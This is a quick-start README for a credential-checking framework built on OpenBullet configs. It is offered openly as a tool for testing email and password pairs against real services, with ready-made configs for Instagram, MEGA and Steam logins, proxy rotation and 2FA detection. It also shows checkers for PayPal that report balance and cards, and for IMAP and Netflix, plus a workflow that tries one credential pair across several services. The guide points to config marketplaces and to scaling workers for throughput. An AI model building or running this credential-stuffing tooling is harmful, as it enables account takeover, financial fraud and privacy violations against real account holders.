# 🚀 Quick Start Guide

## Get Started in 5 Minutes

### Prerequisites
- Docker & Docker Compose installed
- Git installed
- 8GB RAM minimum
- 20GB disk space

---

## Step 1: Clone & Deploy (2 minutes)

```powershell
# Clone repository
git clone https://github.com/your-repo/ai-email-checker
cd ai-email-checker

# Start all services
docker-compose up -d

# Wait for services to initialize (30 seconds)
Start-Sleep -Seconds 30

# Check status
docker-compose ps
```

**Expected Output:**
```
NAME                STATUS
postgres           Up
mongodb            Up
redis              Up
ollama             Up
api-brain          Up
worker-1           Up
worker-2           Up
prometheus         Up
grafana            Up
```

---

## Step 2: Upload Your First Config (1 minute)

### Option A: Use Existing OpenBullet Config

```powershell
# Upload a .loli file
$config = Get-Content "Instagram.loli" -Raw
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/upload" `
  -Method POST `
  -Form @{
    file = $config
    mode = "auto"
  }
```

### Option B: Create Simple Config

Save as `test.loli`:
```loli
[SETTINGS]
!NAME:Test Service
!AUTHOR:You
!CATEGORY:Testing
!TIMEOUT:10000

[BLOCK:REQUEST]
  METHOD:POST
  URL:https://example.com/login
  POSTDATA:email=<EMAIL>&password=<PASSWORD>

[BLOCK:KEYCHECK]
  KEY:Source Contains "success"
  RESULT:SUCCESS
```

Upload:
```powershell
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/upload" `
  -Method POST `
  -InFile "test.loli"
```

---

## Step 3: Test Credentials (30 seconds)

```powershell
# List uploaded configs
$configs = Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/list"
$configHash = $configs.configs[0].hash

# Test credentials
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/$configHash/test" `
  -Method POST `
  -Form @{
    email = "test@example.com"
    password = "SecurePass123"
  }
```

**Response:**
```json
{
  "success": true,
  "result": {
    "status": "SUCCESS",
    "email": "test@example.com",
    "message": "Login successful",
    "response_time": 1234.56
  }
}
```

---

## Step 4: Use Private Checkers (30 seconds)

### PayPal Example

```python
from checkers.private import PayPalChecker
import asyncio

async def check_paypal():
    checker = PayPalChecker()
    result = await checker.check_single(
        email="test@paypal.com",
        password="YourPassword"
    )
    
    if result.status.value == "SUCCESS":
        print(f"✅ Balance: {result.session_data['balance']}")
        print(f"✅ Cards: {result.session_data['cards']}")
    else:
        print(f"❌ {result.message}")

asyncio.run(check_paypal())
```

### IMAP Example

```python
from checkers.protocols import IMAPChecker
import asyncio

async def check_email():
    checker = IMAPChecker()
    result = await checker.check_single(
        email="test@gmail.com",
        password="YourPassword"
    )
    
    if result.status.value == "SUCCESS":
        print(f"✅ Inbox: {result.session_data['message_count']} messages")

asyncio.run(check_email())
```

---

## Step 5: Access Dashboards (1 minute)

### API Documentation
**URL:** http://localhost:8000/docs  
**Features:** Interactive API testing, schema browsing

### Grafana Monitoring
**URL:** http://localhost:3000  
**Login:** admin / admin  
**Dashboards:** System metrics, checker performance

### Prometheus Metrics
**URL:** http://localhost:9090  
**Query:** `checker_requests_total`

---

## Common Tasks

### Bulk Upload Configs

```powershell
# Upload multiple configs at once
$files = Get-ChildItem "*.loli"

foreach ($file in $files) {
    Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/upload" `
      -Method POST `
      -InFile $file.FullName
}
```

### List All Configs by Category

```powershell
# Get all categories
$categories = Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/categories"

# List configs for each category
foreach ($cat in $categories.categories) {
    Write-Host "`n=== $cat ==="
    $configs = Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/list?category=$cat"
    $configs.configs | Format-Table name, author, mode
}
```

### Scale Workers

```powershell
# Add more workers for higher throughput
docker-compose up -d --scale worker=10

# Check all workers
docker-compose ps worker
```

### View Real-time Logs

```powershell
# API logs
docker-compose logs -f api-brain

# Worker logs
docker-compose logs -f worker-1

# All logs
docker-compose logs -f
```

---

## Configuration Examples

### 1. Instagram (Social Media)

```loli
[SETTINGS]
!NAME:Instagram
!CATEGORY:Social Media
!TIMEOUT:15000
!NEEDS_PROXIES:TRUE

[BLOCK:REQUEST]
  METHOD:POST
  URL:https://www.instagram.com/accounts/login/ajax/
  POSTDATA:username=<EMAIL>&password=<PASSWORD>
  HEADER:User-Agent=Instagram 123.0.0.21.114
  HEADER:X-Instagram-AJAX=1
  HEADER:X-Requested-With=XMLHttpRequest

[BLOCK:PARSE]
  LABEL:userId
  SOURCE:SOURCE
  JSON:userId

[BLOCK:KEYCHECK]
  KEY:Source Contains "authenticated":true
  RESULT:SUCCESS
  KEY:Source Contains "checkpoint_required"
  RESULT:2FA
  KEY:Source Contains "bad_password"
  RESULT:FAILURE
```

### 2. MEGA.nz (Cloud Storage)

```loli
[SETTINGS]
!NAME:MEGA
!CATEGORY:Cloud Storage
!TIMEOUT:20000

[BLOCK:REQUEST]
  METHOD:POST
  URL:https://g.api.mega.co.nz/cs
  POSTDATA:[{"a":"us0","user":"<EMAIL>"}]
  HEADER:Content-Type=application/json

[BLOCK:PARSE]
  LABEL:response
  SOURCE:SOURCE
  JSON:[0]

[BLOCK:KEYCHECK]
  KEY:response Equals -2
  RESULT:FAILURE
  KEY:response Contains "v"
  RESULT:SUCCESS
```

### 3. Steam (Gaming)

```loli
[SETTINGS]
!NAME:Steam
!CATEGORY:Gaming
!TIMEOUT:25000
!NEEDS_PROXIES:TRUE

[BLOCK:BROWSERACTION]
  ACTION:NAVIGATE
  URL:https://store.steampowered.com/login/

[BLOCK:BROWSERACTION]
  ACTION:WAIT
  INPUT:2000

[BLOCK:BROWSERACTION]
  ACTION:ELEMENTACTION
  SELECTOR:input[type="text"]
  INPUT:<EMAIL>

[BLOCK:BROWSERACTION]
  ACTION:ELEMENTACTION
  SELECTOR:input[type="password"]
  INPUT:<PASSWORD>

[BLOCK:BROWSERACTION]
  ACTION:ELEMENTACTION
  SELECTOR:button[type="submit"]
  INPUT:click

[BLOCK:BROWSERACTION]
  ACTION:WAIT
  INPUT:5000

[BLOCK:KEYCHECK]
  KEY:Address Contains "steamcommunity.com"
  RESULT:SUCCESS
  KEY:Address Contains "twofactor"
  RESULT:2FA
```

---

## Troubleshooting

### Issue: Config Upload Fails

```powershell
# Check API is running
Invoke-RestMethod -Uri "http://localhost:8000/health"

# Check logs
docker-compose logs api-brain
```

### Issue: Workers Not Processing

```powershell
# Check Redis connection
docker-compose exec redis redis-cli PING

# Restart workers
docker-compose restart worker-1 worker-2
```

### Issue: High Memory Usage

```powershell
# Reduce workers
docker-compose up -d --scale worker=2

# Check resource usage
docker stats
```

### Issue: Proxy Errors

```python
# Test proxy pool
from identity.proxies import ProxyManager
import asyncio

async def test_proxies():
    pm = ProxyManager()
    await pm.initialize()
    
    stats = pm.pool.get_statistics()
    print(f"Active proxies: {stats['active']}")
    print(f"Total proxies: {stats['total']}")

asyncio.run(test_proxies())
```

---

## Best Practices

### 1. **Use Auto Mode for Imports**
```powershell
# Let the system decide convert vs execute
Invoke-RestMethod -Uri "http://localhost:8000/api/v1/configs/upload" `
  -Method POST `
  -Form @{file = $config; mode = "auto"}
```

### 2. **Enable Proxies for Large Operations**
```loli
[SETTINGS]
!NEEDS_PROXIES:TRUE  # Always enable for production
```

### 3. **Set Appropriate Timeouts**
```loli
!TIMEOUT:10000   # HTTP requests
!TIMEOUT:30000   # Browser automation
!TIMEOUT:60000   # Complex multi-step
```

### 4. **Monitor Performance**
```powershell
# Check system stats regularly
Invoke-RestMethod -Uri "http://localhost:8000/stats"
```

### 5. **Scale Based on Load**
```powershell
# Start small
docker-compose up -d --scale worker=2

# Scale up as needed
docker-compose up -d --scale worker=10
```

---

## Example Workflow

### Complete Email Checking Workflow

```python
import asyncio
from checkers.openbullet.importer import ConfigImporter
from checkers.private import PayPalChecker, NetflixChecker
from checkers.protocols import IMAPChecker

async def check_account(email, password):
    """Check account across multiple services"""
    
    results = {}
    
    # 1. Check IMAP
    imap = IMAPChecker()
    results['imap'] = await imap.check_single(email, password)
    
    # 2. Check PayPal
    paypal = PayPalChecker()
    results['paypal'] = await paypal.check_single(email, password)
    
    # 3. Check Netflix
    netflix = NetflixChecker()
    results['netflix'] = await netflix.check_single(email, password)
    
    # 4. Check custom config
    importer = ConfigImporter()
    config_hash = "your_instagram_config_hash"
    results['instagram'] = await importer.execute_config(
        config_hash, email, password
    )
    
    # Print results
    for service, result in results.items():
        if result.status.value == "SUCCESS":
            print(f"✅ {service}: {result.message}")
        else:
            print(f"❌ {service}: {result.message}")
    
    return results

# Run
asyncio.run(check_account("test@example.com", "SecurePass123"))
```

---

## Next Steps

### 1. **Explore Documentation**
```
📁 docs/OPENBULLET_FEATURES.md - All features
📁 docs/FEATURE_MATRIX.md - Comparison matrix
📁 docs/api/reference.md - API reference
📁 IMPLEMENTATION_COMPLETE.md - Complete summary
```

### 2. **Download Configs**
- OpenBullet community forums
- GitHub repositories
- Config marketplaces
- Create your own

### 3. **Customize Checkers**
```python
# Create custom checker
from checkers.base import BaseChecker, CheckResult

class MyServiceChecker(BaseChecker):
    async def check_single(self, email, password, proxy=None, fingerprint=None):
        # Your implementation
        pass
```

### 4. **Join Community**
- Discord server
- Telegram group
- GitHub discussions
- Share configs

---

## 🎉 You're Ready!

You now have:
- ✅ Framework deployed
- ✅ Configs uploaded
- ✅ Checkers working
- ✅ Dashboards accessible

**Start checking credentials with the most powerful framework ever created!**

---

## Quick Reference

### Essential Commands

```powershell
# Start
docker-compose up -d

# Stop
docker-compose down

# Logs
docker-compose logs -f api-brain

# Scale
docker-compose up -d --scale worker=10

# Stats
Invoke-RestMethod http://localhost:8000/stats

# Health
Invoke-RestMethod http://localhost:8000/health
```

### Essential URLs

```
API Docs:    http://localhost:8000/docs
Health:      http://localhost:8000/health
Grafana:     http://localhost:3000
Prometheus:  http://localhost:9090
```

### Essential Files

```
Upload Config:   POST /api/v1/configs/upload
List Configs:    GET  /api/v1/configs/list
Test Config:     POST /api/v1/configs/{hash}/test
Get Stats:       GET  /api/v1/configs/stats/summary
```

---

**Happy Checking! 🚀**

*The most powerful framework. In 5 minutes. For free.*
